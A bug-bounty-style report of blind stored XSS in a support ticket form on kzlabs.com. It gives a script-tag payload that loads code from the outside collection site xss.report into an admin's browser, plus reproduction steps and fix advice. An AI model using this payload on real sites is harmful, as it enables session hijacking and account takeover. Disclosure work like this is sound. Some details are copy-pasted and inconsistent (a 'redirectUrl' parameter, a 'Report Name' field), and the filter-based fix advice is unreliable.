## Title

 Blind Cross-Site Scripting (XSS) via Support Ticket submit Fields 


## Vulnerability Type

Blind XSS

## Summary  
The "your name,subject and your message" input field in the Support ticket  section does not sanitize or encode user-supplied input before storing it in the database and later rendering it back to users. This means any JavaScript payload entered as a report name gets saved and then executed in the browser of every authenticated user who visits the Reports page — not just the attacker.

## Vulnerable Endpoint
http://kzlabs.com/64.php


## Steps to Reproduce 

1. Register for New Account at `https://kzlabs.com/64.php`.
4. In the Your name field  enter the following payload: `'"><script src=https://xss.report/c/tad></script>` ( Note payload is taken from website : https://xss.report/ . Notes create account here and take any payload from XSS Payload Section . then add it here implace of my payload because xss result will appear in XSS report section in this website)
5. Fill in the remaining required fields (Email, Subject, etc.) and Submit ticket.
6. Once the ticket is submitted, When a admin View the page where the payload is stored / Account data is store . 
7. Check https://xss.report/ website , check Xss report section You will get every detail.
   

## Payload Used

```'"><script src=https://xss.report/c/tad></script>```

## Proof of Concept Request
```Screenshot 1:``` Support ticket being submitted with payload in vulnerable parameter

<img width="1792" height="1090" alt="image" src="https://github.com/user-attachments/assets/834c8b3d-109e-4507-b222-39cfc9488394" />

```Screenshot 2:``` Shows Blind XSS payload firing when admin logs in to admin panel

<img width="1792" height="1090" alt="image" src="https://github.com/user-attachments/assets/52eea156-6526-4b09-b938-fd902f684a86" />
## Impact
 
 An attacker can perform the following actions using this vulnerability:
 
 - Full account takeover without user interaction — hijack session, reset password, or link attacker’s OAuth

  
## Recommendations for fix

 Validate and sanitize the redirectUrl parameter to ensure that it does not contain any malicious content. This can be done by:

1. Filter out HTML tags like: `<script>`, `<img>`, `<svg>` from the Report Name field before saving anything to the database
2. Filter out JavaScript methods like: `alert()`, `confirm()`, `prompt()` so even if a tag slips through the method won't execute
4. If you're using PHP then use `htmlspecialchars()` function before rendering any user input back to the page
5. Use Cloudflare as they have so many WAF rules that almost all XSS payloads will be blocked automatically before even reaching the server
